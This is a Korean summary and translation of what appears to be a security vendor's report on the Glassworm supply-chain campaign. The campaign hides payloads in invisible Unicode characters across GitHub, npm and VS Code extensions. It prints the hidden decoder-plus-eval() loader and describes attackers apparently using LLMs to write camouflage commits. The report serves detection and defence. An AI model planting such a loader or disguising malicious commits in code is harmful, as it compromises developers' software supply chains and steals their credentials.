## 핵심 개념

> [!abstract]
> Glassworm 위협 행위자가 보이지 않는 유니코드 문자를 이용해 GitHub, npm, VS Code 마켓플레이스를 대규모로 공격하고 있습니다. 2025년 10월부터 추적된 이 공격은 3월 3-9일 사이에 최소 151개의 GitHub 저장소를 감염시켰으며, Wasmer, Reworm, OpenCode 등 유명 프로젝트도 포함되어 있습니다. 공격자는 눈에 띄지 않는 바이트 디코더를 빈 문자열에 숨겨 eval()을 통해 악성 페이로드를 실행하는 방식을 사용하고 있습니다.

## 상세 내용

- 보이지 않는 유니코드 문자(U+FE00~U+FE0F 범위)를 이용해 eval() 호출로 디코딩되는 악성 페이로드를 삽입
- GitHub 코드 검색 결과 최소 151개 저장소 감염 확인, 실제 규모는 더 클 것으로 예상
- 공격이 GitHub, npm, VS Code 마켓플레이스로 확대되어 생태계 전반에 영향
- AI를 사용한 위장으로 보이는 일반적인 커밋(문서 수정, 버전 업데이트)과 함께 배포되어 시각적 코드 리뷰로 탐지 불가
- 표준 린팅 도구와 수동 코드 리뷰로는 감지 불가능하며 전문 악성코드 스캔 도구 필요

> [!tip] 왜 중요한가
> 보이지 않는 공격 기법이 대규모 오픈소스 공급망을 위협하고 있으며, 개발자는 자신의 저장소와 의존성 보안을 위해 능동적인 방어 도구 도입이 필수입니다.

## 전문 번역

# Glassworm의 귀환: 수백 개 저장소를 노린 보이지 않는 유니코드 공격

지난 1년간 추적해온 보이지 않는 위협이 다시 나타났습니다. PolinRider 캠페인이 GitHub 저장소 수백 개를 침해한 것으로 언론에 오르내리는 사이, 우리는 별개의 움직임으로 Glassworm이 GitHub, npm, VS Code를 대상으로 새로운 공격을 펼치는 것을 목격했습니다.

지난해 10월, 우리는 숨겨진 유니코드 문자를 이용해 GitHub 저장소를 침해하는 기법에 관한 글을 발표했었는데, 이것이 Glassworm이라는 위협 행위자로부터 비롯된 것을 추적했습니다. 이번에는 같은 행위자가 다시 활동을 시작했고, 영향을 받은 저장소 중에는 Wasmer, Reworm, 그리고 OpenCode와 SST의 개발사인 anomalyco의 opencode-bench 같은 유명 프로젝트들이 포함되어 있습니다.

## 보이지 않는 코드 캠페인의 1년

- **2025년 3월**: Aikido가 PUA 유니코드 문자를 이용해 악성 페이로드를 숨긴 npm 패키지를 처음 발견
- **2025년 5월**: 보이지 않는 유니코드의 위험성과 공급망 공격에 악용될 수 있는 방식을 다룬 블로그 게시
- **2025년 10월 17일**: 같은 기법을 사용한 Open VSX 확장 프로그램 침해 적발
- **2025년 10월 31일**: 공격자들이 GitHub 저장소로 초점을 옮긴 것을 발견
- **2026년 3월**: 대규모 새로운 파동 등장: GitHub 저장소 수백 개 침해, npm과 VS Code도 영향받음

## 공격 방식 다시 살펴보기

이번 공격의 규모를 들어가기 전에, 어떤 식으로 작동하는지 정리해보겠습니다. 지난 몇 개월간 많은 보도가 있었는데도 여전히 개발자와 도구들을 놀라게 하고 있거든요.

이 공격의 핵심은 보이지 않는 유니코드 문자를 이용하는 것입니다. 코드 에디터, 터미널, 코드 리뷰 인터페이스 어디에서나 아무것도 표시되지 않는 문자들이죠. 공격자들은 이 보이지 않는 문자들을 사용해 빈 문자열처럼 보이는 곳에 페이로드를 암호화해서 심어둡니다. JavaScript 런타임이 이를 만나면 작은 디코더가 실제 바이트를 추출해서 `eval()`로 넘깁니다.

다음이 주입 코드의 모습입니다. 아래 빈 백틱처럼 보이는 부분이 사실은 비어있지 않다는 점을 기억하세요:

```javascript
const s = v => [...v].map(w => (
w = w.codePointAt(0),
w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
)).filter(n => n !== null);
eval(Buffer.from(s(``)).toString('utf-8'));
```

`s()`로 전달되는 백틱 문자열은 모든 뷰어에서 비어있는 것처럼 보이지만, 실제로는 보이지 않는 문자들로 가득 차 있고, 이들이 디코딩되면 전체 악성 페이로드가 나타납니다. 과거 사건들에서는 Solana를 배포 채널로 삼아 두 번째 단계의 스크립트를 가져와서 실행했는데, 이를 통해 토큰, 자격 증명, 비밀 정보를 탈취할 수 있었습니다.

## 2026년 3월 공격의 규모

Glassworm의 대규모 캠페인이 오픈소스 저장소 전역으로 퍼져나가고 있습니다. GitHub 코드 검색으로 디코더 패턴을 찾으면 현재 최소 151개의 일치하는 저장소가 나옵니다. 이것도 실제 규모보다 적은 수치인데, 글을 작성하는 시점에 이미 삭제된 저장소들이 많기 때문입니다. GitHub 침해는 3월 3일부터 3월 9일 사이에 발생한 것으로 보입니다.

캠페인은 GitHub를 넘어 확산되고 있습니다. npm과 VS Code 마켓플레이스에서도 동일한 기법이 배포되는 것을 우리가 지금 보고 있거든요. 이는 Glassworm이 여러 생태계를 아우르는 조율된 공격을 진행하고 있다는 신호입니다. 이런 행태는 과거 이 그룹이 여러 레지스트리 사이를 오가던 패턴과 일맥상통합니다.

## AI가 돕는 위장술

10월 기사에서 언급했듯이, 악성 주입이 의심스러운 커밋으로 나타나지는 않습니다. 그 주변의 변경 사항들은 현실적입니다. 문서 수정, 버전 업데이트, 작은 리팩토링, 버그 수정 같은 것들이 목표 프로젝트의 스타일과 일치하게 나타나거든요.

이 정도의 프로젝트별 맞춤형 처리를 보면, 공격자들이 대규모 언어 모델을 사용해서 설득력 있는 위장 커밋을 생성하고 있다는 강한 신호입니다. 우리가 보고 있는 규모에서 151개 이상의 서로 다른 코드베이스에 걸쳐 손으로 직접 각기 다른 코드 변경을 만드는 것은 현실적으로 불가능하거든요.

## 탐지와 방어

보이지 않는 위협에 대응하려면 적극적인 방어가 필요합니다. 시각적 코드 리뷰나 표준 린팅만으로는 보이지 않는 것을 잡을 수 없습니다. Aikido에서는 보이지 않는 유니코드 주입 탐지 기능을 악성 코드 스캔 파이프라인에 직접 통합했습니다.

이미 Aikido를 사용하고 있다면, 이러한 패키지들은 피드에서 100/100 심각도 위협으로 플래그 처리됩니다.

아직 Aikido를 사용하지 않으신가요? 무료 계정을 만들고 저장소를 연결하세요. 무료 요금제에도 포함되어 있습니다.
